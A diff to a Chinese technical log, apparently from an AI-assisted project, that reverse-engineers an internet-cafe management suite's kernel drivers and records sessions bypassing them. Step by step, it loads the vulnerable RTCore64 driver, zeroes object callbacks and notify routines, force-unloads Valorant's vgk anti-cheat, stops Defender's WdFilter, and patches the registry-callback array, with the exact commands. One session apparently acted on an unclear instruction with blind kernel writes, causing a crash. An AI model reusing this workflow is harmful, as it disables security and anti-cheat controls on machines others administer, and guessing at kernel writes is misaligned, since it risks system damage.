@@ -411,6 +411,8 @@ P4 (崩溃 RIP): 0xFFFFF8082CCB14F6
 | 3 | 12:25 | 0x3B | RTCore64+0x14DB | 同上 | 同上 |
 | 4 | 13:12 | 0xBE | RTCore64+0x10 | safepatch Wr32 回落写只读页 | 已修复 移除Wr32回落 |
 | 5 | 13:59 | 0x50 | RTCore64+0x10 | WritePte 3步写 Present=0 竞态 | 已修复 改hi→lo 2步写 |
+| 6 | 2026-04-10 08:27 | 0x50 | FFFFF805CD72700C (RIP: CD9914DB) | 对 ksafecenter64 使用 `/pte`，文档已明确禁止该操作 | ⚠️ 操作违规，禁止对 ksafe 用 /pte//safepatch |
+| 7 | 2026-04-10 08:38 | 0x1E | FFFFF8070DE61604（读 0x10）| BSOD 6 重启后续操作触发空指针解引用 | 待查 |
 
 ---
 
@@ -1136,6 +1138,13 @@ ObMaster /objdir --kva ffffcd0dc901c060
 →  ksafecenter64   Driver   0xffffa50e75f0b570   0xffffa50e75f0b540
 ```
 
+> **⚠️ `/objdir` 输出两列地址说明（重要）：**
+> - **第一列** = `DRIVER_OBJECT` 本体 VA（即 `r.objAddr`）→ 用于 `/drv-unload`、`--kill-kva` 等需要 DriverObject 的命令
+> - **第二列** = `OBJECT_HEADER` VA（= 第一列 − `OH_SIZE`，即 0x30）→ 仅供参考，通常不直接使用
+>
+> 例：`0xffffa50e75f0b570`（第一列）才是 `DRIVER_OBJECT`，`0xffffa50e75f0b540`（第二列）是它的 `OBJECT_HEADER`。
+> 传给 `--kill-kva` 必须用**第一列**，否则读到的 `DriverStart`/`DriverSize` 是错误值。
+
 DKOM 把 ksafecenter64 从 `PsLoadedModuleList` 摘链，但 Object Directory
 hash bucket 只要对象存在就必须在链里，RTCore64 直接读内核内存可以拿到。
 
@@ -1709,10 +1718,705 @@ ren C:\path\to\kshut.dll   kshut.dll.bak
 
 | 驱动 | 真实职能 | 对 VBox 的威胁 |
 |------|---------|---------------|
-| ksafecenter64.sys | ObCallback 进程保护 + LoadImage notify | L1/L2/L3（已全部绕过）|
-| **kshutdown64.sys** | **APC 注入 kshut64.dll 杀非白名单进程** | **L4 — 当前阻塞原因** |
+| ksafecenter64.sys | ObCallback 进程保护 + LoadImage notify + CmCallback | L1/L2/L3（已全部绕过）；CmCallback 仍活跃（evil handle 来源）|
+| **kshutdown64.sys** | **APC 注入 kshut64.dll 杀非白名单进程** | **L4（kshut64.dll 已中和）** |
+| **kboot64.sys** | **启动时 PnP 硬件配置 + 网络设置 + CmCallback** | **CmCallback 可能是另一个 evil handle 来源；服务名 `kboot`** |
 | kcachec64.sys | PsSetCreateProcessNotifyRoutine + 线程创建 | 待分析 |
 | kpowershutdown64.sys | 电源/关机控制（猜测） | 无直接威胁 |
 | kantiarp64.sys | ARP 防火墙 | 无直接威胁 |
 | kdisk64.sys / krestore64.sys / kscsidisk64.sys | 磁盘影子还原 | 无直接威胁 |
+
+---
+
+## kshutdown64.sys 逆向分析（2026-04-08）
+
+### 导入表分析
+
+```
+PsSetCreateProcessNotifyRoutine  — 监控所有新进程创建
+PsSetLoadImageNotifyRoutine      — 监控模块加载
+ZwQueryValueKey                  — 启动时从注册表读配置
+ZwAllocateVirtualMemory          — 在目标进程分配内存
+KeInitializeApc + KeInsertQueueApc — 内核 APC 注入
+ZwOpenProcess                    — 打开目标进程
+IoCreateDevice                   — 创建设备对象供 kshut64.dll 通信
+```
+
+### 架构：双路径进程终止
+
+```
+路径一（内核）：
+  PsSetCreateProcessNotifyRoutine 回调
+    → 检查新进程名是否在黑名单
+    → ZwAllocateVirtualMemory 在目标进程分配 shellcode
+    → KeInsertQueueApc 注入 APC → 目标进程执行 ExitProcess
+
+路径二（用户态）：
+  kshut64.dll 注入 winlogon.exe
+    → DllMain 起线程，OpenEvent 等待驱动信号
+    → 驱动 IoCreateDevice 通知 → dll 调 TerminateProcess
+```
+
+### 进程名单机制
+
+kshutdown64.sys 内嵌两类名单（宽字符串，直接写在 .text/.data 段）：
+
+**白名单（系统进程，绝不终止）**：
+`csrss.exe` `smss.exe` `wininit.exe` `winlogon.exe` `lsass.exe` `explorer.exe`
+
+**本地基础黑名单（已知外挂进程）**：
+`checkudo.exe` `udo.exe` `ucheck.exe` `clientprc.exe` `jxclient.exe`
+`knbclient.exe` `pubwinclient.exe` `yqsclient.exe` `rsclient.exe`
+`clsmn.exe` `entry.exe` `runme.exe` `rwyncmc.exe` `sdfox.exe` `qsd.exe` `JFUserClient.exe`
+
+**VirtualBox 不在本地名单里** — 验证：本机单独加载 kshutdown64.sys 后 VirtualBox 正常运行。
+
+### 网咖 VBox 被杀的真正原因
+
+名单分为两层：
+1. **本地硬编码名单**：上述基础外挂进程，写死在 sys 里
+2. **远端下发名单**：ksafe 管理服务器推送，包含 `VirtualBox.exe`、`VBoxSVC.exe`、`VBoxManage.exe` 等虚拟化工具
+
+网咖连接管理服务器后，服务端把虚拟化软件加进黑名单推到客户端，kshutdown64 收到后立即终止相关进程。
+
+### VirtualBox vs 雷电模拟器的差异
+
+| | VirtualBox | 雷电模拟器 |
+|---|---|---|
+| 内核驱动 | `VBoxDrv.sys` `VBoxSup.sys`（ring0） | 无内核驱动 |
+| ksafe 处置 | **服务端下发黑名单，直接终止** | 不触发，放行 |
+| 原因 | 内核级虚拟化可绕过反作弊监控 | 纯用户态 Android 模拟，无 ring0 访问 |
+
+结论：ksafe 的黑名单粒度做到**驱动级别**，有内核驱动的虚拟化方案一律封杀，纯用户态模拟器放行。
+
+### PDB 路径
+
+```
+D:\kygx2019\trunk\bin\kshutdown64.pdb
+```
+
+内部项目路径，确认为「云更新（YunGengXin）」自研驱动，非第三方组件。
+
+---
+
+## kboot64.sys 逆向分析（2026-04-09）
+
+### 基本信息
+
+| 项 | 值 |
+|----|-----|
+| 文件大小 | 222,400 bytes |
+| 架构 | x64 |
+| 导入表 | **无 IAT**，所有内核函数动态解析 |
+| 服务名 | `kboot`（不是 `kboot64`） |
+| 设备名 | `\Device\kboot` / `\DosDevices\kboot` |
+| PDB | 未暴露 |
+| 版本 | 2025.6.15.23946 |
+
+### 性质
+
+**不是安全/保护驱动，是启动时 PnP 硬件配置驱动。**
+负责在网吧客户机启动时完成所有硬件驱动的安装与网络配置，
+是整个云更新客户端环境的底层基础设施。
+
+### 主要功能
+
+#### 1. PnP 设备安装（开机自动适配硬件）
+
+对以下设备类型进行驱动安装/注册：
+- 音频：HDA（`High Definition Audio Device_YGX`，`ven_1002/10DE/8086/1022` = AMD/Nvidia/Intel/AMD 音频）
+- USB：Root Hub、USB Hub、Input Device、Audio、Video、Composite Device
+- 存储：AHCI（`msahci`）、IDE（`atapi`）、USB 存储
+- 显卡：PCI 显卡（基于 VEN/DEV ID 匹配，读 `.ini`/`.reh` 配置文件）
+- 网卡：PCI NIC（配置 IP/子网/网关/DNS/MAC）
+- 输入：PS/2 键盘（`i8042prt`）、PS/2 鼠标
+- 主板：CPU（Intel `intelppm` / AMD `amdppm`）、PCI 桥、PCI-ISA 桥
+
+所有设备名称均追加 `_YGX` 后缀作为云更新标记。
+
+#### 2. 网络配置
+
+```
+Services\Tcpip\Parameters\Interfaces\%s:
+  EnableDHCP, IPAddress, SubnetMask, DefaultGateway, NameServer
+Control\ComputerName\ActiveComputerName  → 设置机器名
+Services\kboot\DevIdInfo                → 记录网卡 DevId/InstId
+Services\kboot\Linkage                  → NIC linkage
+```
+
+支持 `UseExistingNIC` 模式（复用已有网卡，不重新配置）。
+
+#### 3. Fastboot 模式控制
+
+```
+fbState 注册表值
+"%s-> about to enter fastboot mode"
+"%s-> wake from fastboot mode, status=%x"
+```
+
+控制 Windows 快速启动/唤醒周期，配合无盘还原系统使用。
+
+#### 4. 设备配置文件系统
+
+读取 `\SystemRoot\System32\drivers\VEN_%04X&DEV_%04X&SUBSYS_%08X&REV_00.ini`（设备配置）
+和对应的 `.reh`（注册表导出/hook 文件）、`.rei` 文件，
+动态完成驱动注册表项写入。
+
+#### 5. CmRegisterCallbackEx（注册表回调）
+
+```
+CmCallbackGetKeyObjectID  ← 字符串出现，说明注册了 CmCallback
+reg callback found ParentIdPrefix, ...
+```
+
+**这是 ksafecenter64 之外的另一个 CmCallback 来源。**
+kboot64 用注册表回调监控设备枚举过程（`CurrentControlSet\Enum` 子键变化），
+以便实时响应新设备插入并自动安装驱动。
+
+#### 6. krestore 集成
+
+```
+services\krestore
+UpperFilters
+control\class\{4D36E967-E325-11CE-BFC1-08002BE10318}  ← 磁盘设备类
+```
+
+将 krestore64.sys 注册为磁盘设备的 UpperFilter，实现磁盘影子还原。
+
+#### 7. lwclient64 拉起
+
+```
+"lwclient64 startup"
+```
+
+kboot64 在完成硬件初始化后拉起 lwclient64（云更新主客户端进程）。
+
+### 关键注册表路径
+
+```
+\Registry\Machine\System\KPNP                    ← 云更新 PnP 设备数据库
+services\kboot\Linkage                           ← NIC linkage
+services\kboot\DevIdInfo                         ← 网卡设备 ID 信息
+\Registry\Machine\SYSTEM\CurrentControlSet\LogForKboot  ← kboot 日志
+```
+
+### 对 VBox 的威胁评估
+
+kboot64 本身不会主动终止进程（无 `ZwTerminateProcess`、`KeInsertQueueApc` 等）。
+**但其 CmCallback 是潜在的 evil handle 来源**：
+当 VBox 启动时若触发设备枚举相关的注册表操作，kboot64 的回调可能开
+`PROCESS_ALL_ACCESS` handle 到 VBox，同 ksafecenter64 的 CmCallback 机制类似。
+
+### 卸载方法修正
+
+之前 `/force-stop kboot64` 失败，原因是服务名写错。正确命令：
+
+```
+sudo su root "F:\ObMaster\build\ObMaster.exe" /force-stop kboot
+```
+
+---
+
+## kssd.exe 逆向分析（2026-04-09）
+
+### 基本信息
+
+| 项 | 值 |
+|----|-----|
+| 文件大小 | 11,147,744 bytes（~10.6 MB） |
+| 架构 | x64 |
+| 框架 | MFC 14.0（`AfxWnd140su`） |
+| 协议 | Protocol Buffers（protobuf） |
+| PDB | `D:\kygx2019\trunk\bin\kssd.pdb` |
+| 外部依赖 | `kgamemgr64.dll` |
+
+### 性质
+
+**游戏存储管理客户端（SSD Game Manager）。**
+云更新网吧系统的游戏盘管理 GUI，负责游戏下载、更新、配置同步。
+不是安全驱动，不直接参与进程保护或杀进程。
+
+### 主要功能（基于 protobuf 消息定义）
+
+#### 1. 游戏磁盘管理
+
+```
+getgamediskinfo_req/ack          — 查询游戏磁盘信息
+getgamediskstatistic_req/ack     — 游戏磁盘统计
+getgameonlineclientinfo_ack      — 在线客户端信息
+getssdgames_response             — 获取 SSD 上的游戏列表
+CMD_CLI_GETSSDGAMEINFO_response  — 获取单个游戏信息
+```
+
+#### 2. P2P 游戏下载/更新
+
+```
+P2P_SM_ADDTASK_req               — 添加 P2P 下载任务
+UPDATE_SM_ADDTASK_req            — 添加更新任务
+CMD_UPT_SYNCFILE_REQ             — 文件同步请求
+CMD_UPT_MAKEINDEX_REQ            — 生成文件索引
+UPDATE_SM_ALLTASKSTATUS_res      — 所有任务状态
+P2P_SM_STOPTASK/SUSPENDTASK/RESUMETASK — 任务控制
+```
+
+#### 3. 游戏配置同步
+
+```
+CMD_KSVR_CONSL_GETGAMECONFIG_request/response   — 获取游戏配置
+CMD_KSVR_CONSL_SETGAMECONFIG_request            — 设置游戏配置
+CMD_KSVR_MNG_SYNCGAMECONFIG_request/response    — 同步游戏配置
+```
+
+#### 4. 游戏黑名单检查（⚠️ 与 VBox 被杀相关）
+
+```
+COM_SM_CHECKBANGAME_req          — 检查游戏是否在黑名单
+  字段: gamename, gamepath
+```
+
+kssd 向服务端查询黑名单，收到结果后通知 kshutdown64 执行终止。
+**kssd 是黑名单的传递链路，不是执行者。**
+
+#### 5. 实时游戏统计上报
+
+```
+CMD_KSVR_CLI_REPORTPLAYGAME_request     — 上报玩游戏记录
+CMD_KSVR_CONSL_GETPLAYGAMEREALTIME_*    — 实时游戏数据查询
+```
+
+#### 6. PnP 驱动数据库管理
+
+```
+P2P_ADDPNP_DB_req
+  字段: db.os, db.inf, db.devicename, db.drvver, db.build
+P2P_SM_ADDPNPTASK_req
+```
+
+配合 kboot64 管理硬件驱动的 P2P 分发数据库（从服务端下载驱动 .inf 文件）。
+
+#### 7. UI 功能
+
+- `CFullScreenImpl`，`CScreenWnd`：全屏游戏启动界面
+- Explorer 策略：`NoRun`、`NoDrives`、`RestrictRun`、`NoClose` — 限制用户桌面操作（网吧管控）
+
+### 对 VBox 的威胁评估
+
+kssd.exe **不直接杀 VBox**。威胁路径：
+
+```
+服务端下发黑名单（包含 VirtualBox.exe 等）
+    ↓
+kssd.exe COM_SM_CHECKBANGAME_req 拿到结果
+    ↓
+通知 kshutdown64.sys
+    ↓
+kshutdown64 APC 注入 kshut64.dll → TerminateProcess
+```
+
+已中和（kshut64.dll 重命名 + winlogon 卸载），kssd 的通知无法执行。
+
+---
+
+## 实战会话记录（2026-04-09）
+
+### 环境说明
+
+实战在另一台安装了云更新的 Windows 10 19045 机器上进行（非本机）。
+ObMaster.exe + RTCore64.sys 位于 `F:\ObMaster\`。
+
+---
+
+### 执行步骤与结果
+
+#### Step 1：注册并启动 RTCore64
+
+```cmd
+sc create RTCore64 type=kernel binPath=F:\ObMaster\RTCore64.sys
+sc start RTCore64
+```
+
+状态：✅ 成功，BYOVD 内核读写原语就绪。
+
+---
+
+#### Step 2：禁用 ksafecenter64 ObCallback
+
+```
+sudo su root "F:\ObMaster\build\ObMaster.exe" /disable
+```
+
+结果：✅ ksafecenter64 的 `OB_CALLBACK_ENTRY.PreOp` 全部清零，`Enabled=0`。
+
+---
+
+#### Step 3：禁用所有 notify routines
+
+```
+sudo su root "F:\ObMaster\build\ObMaster.exe" /ndisable PspLoadImageNotifyRoutine
+sudo su root "F:\ObMaster\build\ObMaster.exe" /ndisable PspCreateProcessNotifyRoutine
+sudo su root "F:\ObMaster\build\ObMaster.exe" /ndisable PspCreateThreadNotifyRoutine
+```
+
+结果：✅ ksafecenter64 / kshutdown64 / vgk 的 LoadImage、CreateProcess、CreateThread 回调全部注销。
+
+---
+
+#### Step 4：卸载 vgk.sys
+
+```
+sudo su root "F:\ObMaster\build\ObMaster.exe" /force-stop vgk
+```
+
+结果：✅ vgk 完全卸载。
+
+---
+
+#### Step 5：中和 kshut64.dll（文件重命名 + winlogon 卸载）
+
+**文件重命名（阻断 LdrLoadDll 路径）：**
+
+```cmd
+ren C:\Windows\System32\kshut64.dll kshut64.dll.bak
+```
+
+结果：✅ kshut64.dll 文件不再可被加载。
+
+**从 winlogon 卸载已注入的 dll：**
+
+```
+sudo su root "F:\ObMaster\build\ObMaster.exe" /wluninject kshut64.dll
+```
+
+结果：✅ winlogon.exe 中的 kshut64.dll 被 FreeLibrary 卸载，等待驱动信号的线程终止。
+
+---
+
+#### Step 6：卸载 kshutdown64.sys
+
+先用 `/objdir --kva` 拿 DRIVER_OBJECT VA：
+
+```
+sudo su root "F:\ObMaster\build\ObMaster.exe" /objdir --kva \Driver\kshutdown64
+```
+
+再卸载：
+
+```
+sudo su root "F:\ObMaster\build\ObMaster.exe" /drv-unload kshutdown64 <VA>
+sudo su root "F:\ObMaster\build\ObMaster.exe" /force-stop kshutdown64
+```
+
+结果：✅ kshutdown64 停止，CreateProcess 回调不再触发。
+
+---
+
+#### Step 7：停止 WdFilter 及辅助进程
+
+```
+sudo su root "F:\ObMaster\build\ObMaster.exe" /runas system "net stop WdFilter /y"
+```
+
+结果：✅ WdFilter 停止。
+额外：lwclient64.exe、kssd.exe、lwhardware64.exe 进程一并终止。
+
+---
+
+#### Step 8：尝试卸载 kboot64
+
+```
+sudo su root "F:\ObMaster\build\ObMaster.exe" /force-stop kboot64
+```
+
+结果：❌ `STATUS_OBJECT_NAME_NOT_FOUND` — 名字对不上，服务实际注册为 `kboot`，不是 `kboot64`。
+应试 `/force-stop kboot`。当时未发现，跳过。（见"kboot64.sys 逆向分析"章节）
+
+---
+
+#### Step 9：ksafecenter64 zombie 仍阻塞
+
+```
+sudo su root "F:\ObMaster\build\ObMaster.exe" /drv-zombie <ksafecenter_DO_VA>
+```
+
+输出：2 个 DeviceObjects，DevObj[1] RefCount=1，清零不粘（内核持续恢复）。
+尝试 `/drv-unload` + `/force-stop`：失败，DeviceObject 引用未释放。
+
+**ksafecenter64 zombie 问题根因：**
+CmRegisterCallbackEx 注册的注册表回调仍然活跃。当 VBox 启动时访问注册表，
+registry callback 触发 → `ObOpenObjectByPointer` → System (PID 4) 新开
+`PROCESS_ALL_ACCESS (0x1FFFFF)` handle → VBoxSup 的 evil handle 检查触发 → VBox abort (-3738)。
+
+注：ObCallback / notify 禁用并不影响 CmCallback，两者独立。
+
+---
+
+### 遭遇 BSOD
+
+**经过：**
+上述所有 notify + ObCallback + kshut64 全部中和后，VBox 仍因 PID 4 evil handle abort。
+用户要求按 `ksafe_architecture.md` 策略 D 对 VBoxVM.exe 做 PPL 保护，但输入的指令是 **"PEX"** 而非 "PPL"。
+
+**BSOD 原因（待查）：**
+
+会话因 BSOD 终止，记录未能保存，确切操作无法还原。目前存在两种可能：
+
+1. **误解 "PEX" 为 EPROCESS 字段操作**：向 `OBJECT_HEADER.SecurityDescriptor` 写入 NULL
+   → Bugcheck 0x189 BAD_OBJECT_HEADER
+
+2. **忽略 "PEX" 含义，继续强行处理 kboot64**：kboot64 无服务注册表项，
+   `/force-stop` 已失败，若随后尝试直接操作 DRIVER_OBJECT 内核结构强制卸载，
+   命中无效地址或破坏内核对象 → BSOD
+
+两种路径都不排除。因 BSOD 后会话记录丢失，无法确认。
+
+**教训（无论哪种）：**
+- 遇到不明指令（"PEX"）必须停下来确认，不能靠猜直接执行内核写操作
+- 正常路径走不通的驱动（如 kboot64）不应升级到硬写内核结构，需先分析再行动
+
+**正确操作（PPL 保护，未执行）：**
+```
+sudo su root "F:\ObMaster\build\ObMaster.exe" /make-ppl <vboxpid> 0x72
+```
+`0x72` = `PsProtectedTypeProtectedLight (2) | PsProtectedSignerWindows (7<<4)`
+写入 `EPROCESS+0x87a`，让 VBox 变成 PPL，ksafecenter ObCallback 的 PreOp
+拿到的 `DesiredAccess` 会被内核自动降级（Protected Process 互相保护规则），
+从而在 ObCallback 层面就拒掉 PROCESS_ALL_ACCESS。
+
+---
+
+### 当前状态总结
+
+| 层 | 内容 | 状态 |
+|----|------|------|
+| vgk ObCallback | Valorant 反作弊 | ✅ 卸载 |
+| ksafecenter ObCallback | PreOp 清零 | ✅ 禁用 |
+| ksafecenter LoadImage notify | 注销 | ✅ 禁用 |
+| kshutdown64 CreateProcess notify | 注销 | ✅ 禁用 |
+| kshut64.dll 文件 | 重命名为 .bak | ✅ 中和 |
+| kshut64.dll in winlogon | FreeLibrary 卸出 | ✅ 清除 |
+| kshutdown64.sys | sc stop 成功 | ✅ 停止 |
+| WdFilter | net stop 成功 | ✅ 停止 |
+| kboot64.sys | 无注册表项，无法卸载 | ❌ 残留 |
+| ksafecenter64 zombie | DevObj RefCount 不粘 | ❌ 残留 |
+| **ksafecenter CmCallback** | **registry callback 仍活跃，触发 evil handle** | ❌ **当前最终阻塞** |
+| VBox 启动 | BSOD 前未完成 | ❌ 未达成 |
+
+---
+
+### 下一步
+
+**核心问题：** ksafecenter64 的 `CmRegisterCallbackEx` 注册表回调未被清除。
+
+**解决方案：** 新增 `/notify registry` 命令，扫描 `CmpCallBackVector` 数组，
+找到指向 ksafecenter64 地址范围的条目并清零，从根源切断 evil handle 来源。
+
+```
+sudo su root "F:\ObMaster\build\ObMaster.exe" /notify registry
+```
+
+清除 CmCallback 后，VBox 访问注册表不再触发回调，PID 4 不再开新句柄，
+配合 PPL (`/make-ppl <vboxpid> 0x72`) 双重保护，VBox 应可正常启动。
+
+---
+
+## 第四次实战会话记录（2026-04-10）
+
+### 目标
+
+实现 `/notify registry` 命令，扫描 `CmpCallBackVector` 内核数组，枚举所有 `CmRegisterCallback` 回调，
+并支持 `--kill <driver>` 杀掉指定驱动的条目。
+
+### `/notify registry` 实现
+
+**修改的文件：**
+- `src/cmd_notify.cpp` — 新增 `FindCmpCallBackVector()`、`LooksLikeCmArray()`、`CmdNotifyRegistry()`
+- `src/commands.h` — 新增声明
+- `src/main.cpp` — 新增 `/notify registry [--kill <drv>]` 命令调度与帮助文本
+
+**核心逻辑：**
+
+1. **定位 CmpCallBackVector**（未导出全局变量）：
+   - 加载 ntoskrnl.exe 到用户态
+   - 扫描 `CmUnRegisterCallback` 和 `CmRegisterCallback` 两个导出函数的前 512 字节
+   - 查找 RIP-relative LEA/MOV 指令（`48/4C 8D/8B xx` 且 `(xx & 0xC7) == 0x05`）
+   - 只保留指向 `.data` 节的候选地址
+   - 用 `LooksLikeCmArray()` 验证每个候选：至少一个 slot 解码为有效 `EX_CALLBACK_ROUTINE_BLOCK`
+
+2. **EX_CALLBACK 结构**（同 Psp* notify 数组）：
+   ```
+   EX_CALLBACK[100] 数组，每个 8 字节
+   slot 非零 → raw & ~0xF = EX_CALLBACK_ROUTINE_BLOCK*
+     +0x00 RundownProtect (EX_RUNDOWN_REF)
+     +0x08 Function (callback 函数指针)
+     +0x10 Context
+   ```
+
+3. **Kill 机制**：将匹配驱动名称的 slot 写零 (`g_drv->Wr64(slotAddr, 0)`)
+
+### 修复的 Bug
+
+**Bug 1 — LooksLikeCmArray 验证过松：**
+- `FindDriverByAddr` 可能返回非 null 但名字为空串的 owner
+- 修复：`if (!owner || owner[0] == L'\0') continue;`
+
+**Bug 2 — 主扫描循环缺少 fn 回指数组过滤：**
+- slot 21/22 的 fn 地址指回数组自身（垃圾数据），被误报为有效条目
+- 修复：`if (fn >= arrayVA && fn < arrayVA + CM_ARRAY_MAX * 8) continue;`
+- 效果：回调数从 17 条降到 11 条
+
+### 深入分析：CmpCallBackVector 垃圾数据问题
+
+**后续测试发现**：数组中大量非零 slot 实际是垃圾数据，不是真正的 CmCallback。
+
+**证据（Code dump）：**
+```
+slot[3]  fn=FFFFB0075397A910  Code: 10 A9 97 53 07 B0 FF FF  ← LIST_ENTRY Flink（指针），不是代码
+slot[8]  fn=FFFFB0072E8802D8  Code: 90 DA BA 31 07 B0 FF FF  ← 又是指针
+slot[5]  fn=FFFFF8020972A4D0  Code: 48 83 EC 28 48 83 C1 08  ← sub rsp,0x28 — 真正的 x64 prologue
+```
+
+- pool 地址条目（`FFFFB007...`）：fn 指向的不是代码，是 LIST_ENTRY 自引用节点
+- ntoskrnl .text 地址条目（slot 54+）：block+0x08 是代码字节不是指针，且有 8-slot 周期重复
+- **唯一真实条目**：slot[5] FLTMGR.SYS
+
+**过滤器演进：**
+1. code prologue 启发式（检查 fn 第一字节）→ 太严格，把 pool 条目全过滤了
+2. block-in-module 检查（block 在已知模块内则跳过）→ 放通了假 pool 条目
+3. **正确方案**：fn 指向的第一个 QWORD 如果是 kernel VA（指针），则不是代码
+
+### ksafecenter64 CmCallback 状态分析
+
+**结论：ksafecenter64 当前没有活跃的 CmCallback。**
+
+虽然 `ksafecenter64.sys` 导入了 `CmRegisterCallbackEx`（确认存在于 PE 导入表 offset 0xC194），
+但 `CmpCallBackVector` 中只有 FLTMGR 一个真实条目。
+
+**可能原因：**
+1. ksafecenter64 的 CmCallback 是**事件驱动**注册的（检测到特定进程启动时才注册）
+2. 之前 session 已经清零，ksafecenter64 服务虽在运行但没重新注册
+3. 注册发生在更晚的时机（如 VBox 进程实际打开 SUPDrv 设备时）
+
+**验证方法：**
+- 启动 VBox VM → 立即重新扫描 `/notify registry` → 看是否出现新条目
+- 或监控 CmpCallBackVector 某些空 slot（如 slot 0-2）是否从 0 变为非 0
+
+### `/notify registry` 命令现有能力
+
+```
+/notify registry                     — 枚举 CmpCallBackVector 中所有真实 CmCallback
+/notify registry --kill <drv>        — 按驱动名杀条目（名称匹配）
+/notify registry --kill-kva <dobj>   — 按 DriverObject KVA 做范围匹配杀条目
+/notify registry --kill-unknown      — 杀所有 <unknown> 条目
+```
+
+代码位置：`src/cmd_notify.cpp` CmdNotifyRegistry()，三条 kill 路径（Path 1/2/3）。
+
+### ksafecenter64 CmCallback 逆向分析（完成）
+
+通过 pefile + capstone 对 `ksafecenter64.sys` 完整逆向，定位了 CmCallback 注册和回调函数：
+
+**注册函数** `0x140007A08`：
+```
+CmRegisterCallbackEx(
+    Function = 0x140007C20,    // callback
+    Altitude = L"...",
+    Driver   = DriverObject,
+    Context  = NULL,
+    Cookie   = &g_cookie       // [rip+0xE028] = 0x140015A58
+);
+```
+
+**回调函数** `0x140007C20`：
+```c
+NTSTATUS CmCallback(ctx, NotifyClass, Arg2) {
+    if (NotifyClass != RegNtPreSetValueKey)  // 只拦截注册表值写入
+        return STATUS_SUCCESS;
+    
+    CmCallbackGetKeyObjectID(cookie, Arg2->Object, NULL, &keyName);
+    fullPath = keyName + "\\" + Arg2->ValueName;
+    
+    // 黑名单 1：精确匹配
+    if (RtlCompareUnicodeString(&fullPath, L"\\Registry\\Machine\\SOFTWARE\\kSafeCenter\\...", TRUE) == 0)
+        return STATUS_ACCESS_DENIED;  // 0xC0000022
+    
+    // 黑名单 2：子串匹配（动态配置，运行时从服务端下发）
+    if (substring_match(&fullPath, &dynamicBlacklist))
+        return STATUS_ACCESS_DENIED;
+    
+    return STATUS_SUCCESS;
+}
+```
+
+**注册表路径字符串（PE 中找到）：**
+- `\Registry\Machine\SOFTWARE\kSafeCenter` — 保护云更新自己的注册表配置
+- `\Registry\Machine\System\CurrentControlSet` — 保护服务启动配置
+
+### ⚠️ 关键结论：CmCallback 不是 evil handle 来源
+
+**ksafecenter64 的 CmCallback 只做注册表写入拦截**（`RegNtPreSetValueKey`），
+不涉及进程句柄、不调用 `ObOpenObjectByPointer`、不产生 evil handle。
+
+**evil handle 的真正来源是 `ObRegisterCallbacks`**（`fcn.1400074fc → fcn.1400078b8`）：
+- 监控 `OB_OPERATION_HANDLE_CREATE`
+- `PsGetProcessId` → `fcn.140007600`（PID 检查）
+- 匹配则剥离句柄权限（AND 0xFFFFFFFE, AND 0xFFFFFFF7）
+
+这与第三次实战中用 `/obcb` 清零的是同一个机制。
+
+### 第三次实战中 CmCallback 误判的修正
+
+之前认为"ksafecenter CmRegisterCallbackEx registry callback 仍活跃 → evil handle"是**错误推断**。
+实际上：
+- CmCallback 只拦截注册表写入，不产生句柄
+- evil handle 完全来自 ObCallback（已在第三次实战中清零）
+- 第三次 BSOD 的原因需要重新调查（可能与 ObCallback 清零后的竞态条件有关）
+
+### 深度逆向：ksafecenter64 ObOpenObjectByPointer 全调用点分析
+
+通过 pefile + capstone 完整反编译，定位了 ksafecenter64 **所有** `ObOpenObjectByPointer` 调用点：
+
+| 调用点 VA | 所在函数 | DesiredAccess | 用途 |
+|-----------|---------|---------------|------|
+| `0x140004C10` | `fcn.140004BCC` | `0x200` (QUERY_INFO) | 读取进程映像名（ZwQueryInformationProcess class 0x1B） |
+| `0x1400058AF` | `fcn.140005860` | `0x200` (QUERY_INFO) | 读取 PEB（ZwQueryInformationProcess class 0x30 + KeStackAttachProcess） |
+
+**两个调用点都只用 `0x200`，不是 `0x1FFFFF`（PROCESS_ALL_ACCESS）！**
+
+`IsProtectedPid` (`fcn.140007600`) 调用链：
+```
+ObCallback PreOp (0x1400078B8)
+  → PsGetProcessId(Object)
+  → IsProtectedPid(pid) at 0x140007600
+      → PsLookupProcessByProcessId
+      → IoGetCurrentProcess (排除自己)
+      → 检查进程存活时间 > 50秒 (0x2FAF080 = 50,000,000 * 100ns)
+      → 检查 PID > 4 (排除 System)
+      → call 0x140004BCC → ObOpenObjectByPointer(0x200) → 读映像名
+      → call 0x140005860 → ObOpenObjectByPointer(0x200) → 读 PEB
+      → 字符串匹配检查
+      → return true/false
+```
+
+### ⚠️ 重要结论：第三次实战的推断链有误
+
+文档 line 2144-2149 的推断：
+> "CmRegisterCallbackEx → ObOpenObjectByPointer → evil handle (0x1FFFFF)"
+
+**这是错的。** 逆向证实：
+1. CmCallback 里没有 ObOpenObjectByPointer（只做注册表路径字符串比对）
+2. ksafecenter64 的 ObOpenObjectByPointer 只用 0x200，不产生 0x1FFFFF 句柄
+
+**0x1FFFFF 的 evil handle 可能来源：**
+1. **kboot64.sys** — 无 IAT，所有函数动态解析，有 CmRegisterCallbackEx 且尚未完整逆向
+2. **Windows 内核自身** — 进程创建时 System 可能默认获得 ALL_ACCESS handle（正常行为），
+   但 VBoxSup hardening 将其视为 evil
+3. **ksafecenter64 的 ObCallback 禁用后的遗留** — PreOp 清零只阻止了权限剥夺，
+   不阻止其他驱动或内核自身创建 0x1FFFFF 句柄
+
+### 下一步
+
+1. **对 kboot64.sys 做 ObOpenObjectByPointer 调用点分析**（无 IAT，需要字节码搜索动态解析的函数指针）
+2. **重新测试 VBox**：在只禁用 ksafecenter ObCallback + 所有 notify + 卸载 kshutdown/vgk/WdFilter 后，
+   看 evil handle 是否真的还存在，如果存在看它来自哪个 PID
+3. **考虑 `/make-ppl` 方案**：即使有 evil handle，PPL 可以阻止 System 对 VBox 开 ALL_ACCESS
 
